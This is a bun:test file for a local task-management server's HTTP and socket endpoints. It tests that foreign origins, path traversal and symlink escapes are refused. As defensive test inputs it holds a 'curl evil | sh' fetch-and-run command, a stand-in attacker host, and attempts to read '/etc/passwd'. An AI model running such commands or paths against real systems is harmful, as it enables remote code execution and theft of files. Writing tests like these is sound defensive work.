import { afterEach, describe, expect, test } from 'bun:test';
import { mkdirSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import type { AgentModel, ServerMessage, ShinsaState } from '@shinsa/core';
import { type ModelCatalog, Transcripts } from '../../src/agents/index.ts';
import type { ServerConfig } from '../../src/config/index.ts';
import { createWorktree } from '../../src/git/index.ts';
import { type Launcher, startServer } from '../../src/http/index.ts';
import { MAX_FILE_BYTES } from '../../src/http/routes.ts';
import { Engine } from '../../src/runtime/index.ts';
import { EventLog, EvidenceStore } from '../../src/store/index.ts';
import { createGitRepo, createTempDir, createTestConfig, until, writeFiles } from '../helpers/index.ts';

const running: (() => Promise<void>)[] = [];

afterEach(async () => {
  for (const stop of running.splice(0)) await stop();
});

function createModels(models: AgentModel[]) {
  return { list: () => Promise.resolve(models) } as unknown as ModelCatalog;
}

async function start(options: { config?: Partial<ServerConfig>; launch?: Launcher } = {}) {
  const config = createTestConfig(createTempDir(), options.config);
  const engine = new Engine(new EventLog(config.databasePath));
  const transcripts = new Transcripts(config.transcriptsDir);
  const evidence = new EvidenceStore(config.evidenceDir);
  const http = startServer({
    engine,
    config,
    transcripts,
    evidence,
    models: createModels([{ id: 'opus', label: 'Opus', description: 'x' }]),
    launch: options.launch,
  });
  running.push(http.stop);
  const base = `http://127.0.0.1:${http.server.port}`;
  const call = (path: string, init: RequestInit = {}) => fetch(`${base}${path}`, init);
  const post = (path: string, body: unknown) =>
    call(path, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });
  return { config, engine, transcripts, evidence, base, call, post };
}

async function startWithWorktree(launch?: Launcher) {
  const server = await start({ launch });
  const { repo } = await createGitRepo();
  const worktree = await createWorktree(repo, server.config.worktreesDir, 'task-xyz123', 'fix/thing', null);
  await server.engine.dispatch({
    type: 'repo.register',
    repo: { ...repo, checkCommands: [], previewCommand: null },
    areaName: null,
  });
  const repoId = Object.keys(server.engine.state.repos)[0] ?? '';
  await server.engine.dispatch({ type: 'task.create', intent: 'Fix the thing', repoId });
  const taskId = Object.keys(server.engine.state.tasks)[0] ?? '';
  await server.engine.dispatch({
    type: 'task.triage',
    taskId,
    title: 'Fix the thing',
    repoId,
    size: 'small',
    branch: 'fix/thing',
    dependsOn: [],
  });
  await server.engine.dispatch({
    type: 'worktree.ready',
    taskId,
    path: worktree.path,
    branch: worktree.branch,
  });
  return { ...server, taskId, worktree: worktree.path };
}

describe('the request guard', () => {
  test('a foreign Host, a foreign Origin and a text/plain post are refused before anything runs', async () => {
    const { call } = await start();
    expect((await call('/api/queue', { headers: { host: 'attacker.example:5180' } })).status).toBe(403);
    expect((await call('/api/queue', { headers: { origin: 'https://attacker.example' } })).status).toBe(403);
    const simplePost = await call('/api/commands', {
      method: 'POST',
      headers: { 'content-type': 'text/plain' },
      body: JSON.stringify({
        type: 'repo.update',
        repoId: 'x',
        patch: { checkCommands: ['curl evil | sh'] },
      }),
    });
    expect(simplePost.status).toBe(415);
    expect((await call('/', { headers: { host: 'attacker.example' } })).status).toBe(403);
  });
});

describe('commands', () => {
  test('a user command is dispatched and the new task id returned', async () => {
    const { post, engine } = await start();
    const response = await post('/api/commands', { type: 'task.create', intent: 'Add search', repoId: null });
    const body = (await response.json()) as { ok: boolean; taskId: string };
    expect(body.ok).toBe(true);
    expect(engine.state.tasks[body.taskId]?.intent).toBe('Add search');
    expect(
      await (await post('/api/commands', { type: 'area.write', area: { name: 'A', color: 'blue' } })).json()
    ).toEqual({
      ok: true,
      taskId: null,
    });
  });

  test('system commands, junk and bad JSON are refused with a reason', async () => {
    const { post, call } = await start();
    for (const body of [{ type: 'run.end', runId: 'x' }, null, 'task.create', { type: 7 }]) {
      const response = await post('/api/commands', body);
      expect(response.status).toBe(400);
      expect(await response.json()).toEqual({
        error: { code: 'command_forbidden', message: 'Unknown command.' },
      });
    }
    const broken = await call('/api/commands', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: '{',
    });
    expect(await broken.json()).toMatchObject({ error: { code: 'body_invalid' } });
    const rejected = await post('/api/commands', { type: 'task.create', intent: ' ', repoId: null });
    expect(rejected.status).toBe(400);
  });
});

describe('read endpoints', () => {
  test('the queue, the models and unknown paths', async () => {
    const { call } = await start();
    expect(await (await call('/api/queue')).json()).toMatchObject({ decisions: [], working: [] });
    expect(await (await call('/api/models')).json()).toEqual([
      { id: 'opus', label: 'Opus', description: 'x' },
    ]);
    const missing = await call('/api/nothing');
    expect(missing.status).toBe(404);
    expect(
      (await call('/api/models', { method: 'POST', headers: { 'content-type': 'application/json' } })).status
    ).toBe(404);
  });

  test('evidence is served by name only', async () => {
    const { call, evidence, config } = await start();
    const uri = evidence.writeText('proof');
    writeFileSync(join(config.dataDir, 'secret.txt'), 'secret');
    expect(await (await call(uri)).text()).toBe('proof');
    for (const path of ['/api/evidence/..%2Fsecret.txt', '/api/evidence/..', '/api/evidence/missing.png']) {
      expect((await call(path)).status).toBe(404);
    }
  });
});

describe('worktree endpoints', () => {
  test('a file is read from the worktree, never from outside it', async () => {
    const { call, taskId, worktree } = await startWithWorktree();
    writeFiles(worktree, { 'src/a.ts': 'export {};\n', 'big.txt': 'x'.repeat(MAX_FILE_BYTES + 1) });
    const outside = createTempDir();
    writeFiles(outside, { 'secret.txt': 'secret' });
    symlinkSync(join(outside, 'secret.txt'), join(worktree, 'leak.txt'));
    const read = (path: string) => call(`/api/tasks/${taskId}/file?path=${encodeURIComponent(path)}`);
    expect(await (await read('src/a.ts')).json()).toEqual({ path: 'src/a.ts', content: 'export {};\n' });
    expect(await (await read('src/missing.ts')).json()).toEqual({ path: 'src/missing.ts', content: null });
    for (const path of ['../../../../etc/passwd', '/etc/passwd', 'leak.txt']) {
      expect(await (await read(path)).json()).toMatchObject({ error: { code: 'path_invalid' } });
    }
    expect(await (await read('big.txt')).json()).toMatchObject({ error: { code: 'file_too_large' } });
    expect((await call('/api/tasks/nope/file?path=a')).status).toBe(404);
    expect((await call('/api/tasks/nope/diff')).status).toBe(404);
  });

  test('the diff covers new files', async () => {
    const { call, taskId, worktree } = await startWithWorktree();
    writeFiles(worktree, { 'new.ts': 'x\n' });
    const diff = (await (await call(`/api/tasks/${taskId}/diff`)).json()) as { files: { path: string }[] };
    expect(diff.files.map((file) => file.path)).toEqual(['new.ts']);
  });

  test('a stacked task diffs against its unmerged base, and a broken worktree is a request error', async () => {
    const server = await startWithWorktree();
    const { engine, call, taskId, worktree, post } = server;
    await post('/api/commands', {
      type: 'task.create',
      intent: 'On top',
      repoId: Object.keys(engine.state.repos)[0],
    });
    const top = Object.keys(engine.state.tasks).find((id) => id !== taskId) ?? '';
    const state = engine.state as ShinsaState;
    state.tasks[top] = {
      ...(state.tasks[top] as ShinsaState['tasks'][string]),
      worktreePath: worktree,
      baseTaskId: taskId,
    };
    expect((await call(`/api/tasks/${top}/diff`)).status).toBe(200);
    state.tasks[top] = {
      ...(state.tasks[top] as ShinsaState['tasks'][string]),
      worktreePath: createTempDir(),
      baseTaskId: null,
    };
    const broken = await call(`/api/tasks/${top}/diff`);
    expect(broken.status).toBe(400);
  });

  test('open runs the editor at a line, Terminal or Finder, and nothing else', async () => {
    const launched: string[][] = [];
    const launch: Launcher = (command) => {
      launched.push(command);
      return Promise.resolve({ ok: true, code: 0, stdout: '', stderr: '', timedOut: false });
    };
    const { post, taskId, worktree, config } = await startWithWorktree(launch);
    config.editor = 'zed';
    const open = (body: unknown) => post(`/api/tasks/${taskId}/open`, body);
    expect(await (await open({ target: 'editor', path: 'README.md', line: 3 })).json()).toEqual({ ok: true });
    await open({ target: 'editor', path: 'README.md' });
    await open({ target: 'editor', path: '../../etc/passwd', line: 1.5 });
    await open({ target: 'terminal' });
    await open({ target: 'finder', path: 7 });
    expect((await open({ target: 'constructor' })).status).toBe(400);
    expect((await open(null)).status).toBe(400);
    expect((await post('/api/tasks/nope/open', { target: 'finder' })).status).toBe(404);
    expect(launched.map((command) => command.slice(0, 2).join(' '))).toEqual([
      `zed ${worktree}`,
      `zed ${worktree}`,
      `zed ${worktree}`,
      'open -a',
      `open ${worktree}`,
    ]);
    expect(launched[0]?.at(-1)?.endsWith('README.md:3')).toBe(true);
    expect(launched[1]?.at(-1)?.endsWith('README.md')).toBe(true);
    expect(launched[2]).toHaveLength(2);
    config.editor = null;
    await open({ target: 'editor' });
    expect(['code', 'cursor']).toContain(launched.at(-1)?.[0] ?? '');
  });

  test('the default launcher really runs the command', async () => {
    const log = join(createTempDir(), 'open.log');
    process.env.FAKE_OPEN_LOG = log;
    try {
      const { post, taskId } = await startWithWorktree();
      expect(await (await post(`/api/tasks/${taskId}/open`, { target: 'finder' })).json()).toEqual({
        ok: true,
      });
    } finally {
      delete process.env.FAKE_OPEN_LOG;
    }
  });
});

describe('the web app', () => {
  test('serves built files, falls back to index.html, and says when it is not built', async () => {
    const { call, config } = await start();
    expect((await call('/')).status).toBe(503);
    mkdirSync(join(config.webDir, 'assets'), { recursive: true });
    writeFileSync(join(config.webDir, 'index.html'), '<html>app</html>');
    writeFileSync(join(config.webDir, 'assets', 'app.js'), 'run()');
    writeFileSync(join(config.dataDir, 'secret.txt'), 'secret');
    expect(await (await call('/assets/app.js')).text()).toBe('run()');
    expect(await (await call('/tasks/abc')).text()).toBe('<html>app</html>');
    expect(await (await call('/')).text()).toBe('<html>app</html>');
    expect(await (await call('/..%2F..%2Fdata%2Fsecret.txt')).text()).toBe('<html>app</html>');
  });
});

describe('the socket', () => {
  function connect(base: string, origin: string | null = 'http://localhost:5181') {
    const socket = new WebSocket(
      base.replace('http', 'ws').concat('/ws'),
      origin ? { headers: { origin } } : undefined
    );
    const messages: ServerMessage[] = [];
    socket.addEventListener('message', (event) =>
      messages.push(JSON.parse(String(event.data)) as ServerMessage)
    );
    const opened = new Promise<void>((resolve, reject) => {
      socket.addEventListener('open', () => resolve());
      socket.addEventListener('error', () => reject(new Error('socket refused')));
    });
    return { socket, messages, opened };
  }

  test('a socket from another site, or without an Origin, is refused', async () => {
    const { base, call } = await start();
    expect(connect(base, 'https://attacker.example').opened).rejects.toThrow('socket refused');
    expect(connect(base, null).opened).rejects.toThrow('socket refused');
    expect((await call('/ws', { headers: { origin: 'http://localhost:5181' } })).status).toBe(400);
  });

  test('state on connect and on every change, acks for commands, transcripts on subscription', async () => {
    const { base, engine, transcripts } = await start();
    const client = connect(base);
    await client.opened;
    await until('the first state', () => client.messages.length === 1);
    expect(client.messages[0]?.type).toBe('state');
    client.socket.send(
      JSON.stringify({
        type: 'command',
        id: 'c1',
        command: { type: 'task.create', intent: 'Do it', repoId: null },
      })
    );
    client.socket.send(
      JSON.stringify({ type: 'command', id: 'c2', command: { type: 'run.end', runId: 'x' } })
    );
    client.socket.send(
      JSON.stringify({
        type: 'command',
        id: 'c3',
        command: { type: 'task.create', intent: ' ', repoId: null },
      })
    );
    client.socket.send('not json');
    client.socket.send(JSON.stringify({ nope: true }));
    await until('the acks', () => client.messages.filter((message) => message.type === 'ack').length === 3);
    const acks = client.messages.filter((message) => message.type === 'ack');
    expect(acks.map((ack) => ack.type === 'ack' && [ack.id, ack.error?.code ?? null])).toEqual([
      ['c1', null],
      ['c2', 'command_forbidden'],
      ['c3', expect.any(String)],
    ]);
    expect(
      client.messages.some(
        (message) => message.type === 'state' && Object.keys(message.state.tasks).length === 1
      )
    ).toBe(true);

    transcripts.record('run-1', { type: 'agent', phase: 'interim', text: 'before' });
    client.socket.send(JSON.stringify({ type: 'transcript.subscribe', runId: 'run-1' }));
    client.socket.send(JSON.stringify({ type: 'transcript.subscribe', runId: 'run-1' }));
    await until('the transcript', () => client.messages.some((message) => message.type === 'transcript'));
    transcripts.record('run-1', { type: 'agent', phase: 'interim', text: 'live' });
    transcripts.record('run-2', { type: 'agent', phase: 'interim', text: 'other run' });
    await until('the live entry', () =>
      client.messages.some((message) => message.type === 'transcript' && message.reset === false)
    );
    client.socket.send(JSON.stringify({ type: 'transcript.unsubscribe', runId: 'run-1' }));
    client.socket.send(JSON.stringify({ type: 'transcript.subscribe', runId: 'run-3' }));
    await until('the second subscription', () =>
      client.messages.some((message) => message.type === 'transcript' && message.runId === 'run-3')
    );
    expect(
      client.messages.some((message) => message.type === 'transcript' && message.runId === 'run-2')
    ).toBe(false);
    client.socket.close();
    await Bun.sleep(20);
    await engine.dispatch({ type: 'area.write', area: { name: 'After close', color: 'blue' } });
  });

  test('a socket message that fails after parsing is logged', async () => {
    const { base, transcripts } = await start();
    const original = transcripts.listEntries.bind(transcripts);
    transcripts.listEntries = () => {
      throw new Error('disk gone');
    };
    const client = connect(base);
    await client.opened;
    client.socket.send(JSON.stringify({ type: 'transcript.subscribe', runId: 'run-1' }));
    await Bun.sleep(30);
    transcripts.listEntries = original;
    expect(client.messages.every((message) => message.type === 'state')).toBe(true);
    client.socket.close();
  });
});
